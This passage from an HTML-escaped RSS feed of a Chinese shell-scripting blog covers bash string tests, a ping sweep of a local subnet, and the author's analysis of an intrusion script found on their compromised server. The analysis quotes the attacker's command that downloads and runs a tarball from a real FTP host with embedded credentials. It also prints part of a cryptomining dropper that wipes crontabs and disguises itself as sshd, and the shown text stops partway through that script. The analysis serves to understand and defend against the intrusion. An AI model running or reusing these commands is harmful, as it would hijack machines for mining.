&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; *sub_string &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var ends with sub_string.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Inverse (var does not end with sub_string).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; *sub_string &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var does not end with sub_string.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;循环&#34;&gt;循环&lt;/h1&gt;
&lt;h2 id=&#34;数字范围循环&#34;&gt;数字范围循环&lt;/h2&gt;
&lt;p&gt;Alternative to &lt;code&gt;seq&lt;/code&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>列出网络中活动的主机</title>
      <link>https://wdd.js.org/shell/list-active-host/</link>
      <pubDate>Thu, 26 Dec 2019 10:34:15 +0800</pubDate>
      <guid>https://wdd.js.org/shell/list-active-host/</guid>
      <description>&lt;h1 id=&#34;使用-ping&#34;&gt;使用 ping&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;原生，不用安装软件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点
&lt;ul&gt;
&lt;li&gt;速度慢&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面的脚本列出 192.168.1.0/24 的所有主机，大概需要 255 秒&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; handler &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;will exit&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  exit &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;handler&amp;#39;&lt;/span&gt; SIGINT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ip in 192.168.1.&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1..255&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ping -W &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; $ip &amp;amp;&amp;gt; /dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $? -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo $ip is alive
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo $ip is dead
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用-fping&#34;&gt;使用 fping&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;速度快&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点
&lt;ul&gt;
&lt;li&gt;需要安装 fping&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装fping&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;brew install fping &lt;span style=&#34;color:#75715e&#34;&gt;# mac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install fping &lt;span style=&#34;color:#75715e&#34;&gt;# centos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install fping &lt;span style=&#34;color:#75715e&#34;&gt;# debian&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我用的 fping 是 MacOS X， fping 的版本是 4.2&lt;/p&gt;</description>
    </item>
    <item>
      <title>入侵脚本分析 - 瞒天过海</title>
      <link>https://wdd.js.org/shell/evil-script/</link>
      <pubDate>Mon, 23 Dec 2019 18:54:01 +0800</pubDate>
      <guid>https://wdd.js.org/shell/evil-script/</guid>
      <description>&lt;p&gt;机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;下载恶意软件&#34;&gt;下载恶意软件&lt;/h1&gt;
&lt;p&gt;恶意软件的是使用 ftp 下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个 153.122.137.67 IP 是位于日本东京，ssd.taz 是一个 tar 包，用 tar 解压之后，出现一个 sh 文件，两个可执行文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;907&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 20:58 go &lt;span style=&#34;color:#75715e&#34;&gt;# shell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxrwxr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; 1.3M Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 21:06 i686 &lt;span style=&#34;color:#75715e&#34;&gt;# 可执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxrwxr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; 1.1M Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 21:06 x86_64 &lt;span style=&#34;color:#75715e&#34;&gt;# 可执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;分析可执行文件-go&#34;&gt;分析可执行文件 go&lt;/h1&gt;
&lt;p&gt;go 是一个 shell 程序，下文是分析&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pool.supportxmr.com门罗币的矿池&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 所以大家应该清楚了，入侵的机器应该用来挖矿的&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步是测试本机与矿池dns是否通&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;ping -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; pool.supportxmr.com 2&amp;gt;/dev/null|grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bytes of data&amp;#34;&lt;/span&gt; | wc -l &lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; -gt &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;   &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# dns通&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-d&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# dns不通&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 删除用户计划任务，并将报错信息清除&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crontab -r 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步不太懂&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf /tmp/.lock 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 设置当前进程的名字，为了掩人耳目，起个sshd, 鱼目混珠&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXEC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sshd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前目录&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;pwd&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取参数个数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这个程序传了一个 -r 参数，所以$#的值是1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$#&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ARGS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# 遍历每一个参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; var in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$@&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-f&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ARGS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ARGS&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# $var不是-f, 所以ARGS被这是为-r&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; ! -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$FAKEPROC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			FAKEPROC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$((&lt;/span&gt;FAKEPROC+1&lt;span style=&#34;color:#66d9ef&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 这里不会执行，因为$FAKEPROC是空字符串&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-h&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			FAKEPROC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 这里也不会执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$FAKEPROC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			EXEC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 这里也不会执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; ! -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$dns&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ARGS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ARGS&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$dns&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 如果本机与矿池dns通，则这里不会执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 创建目录&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir -- &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#创建 .sshd目录&lt;/span&gt;
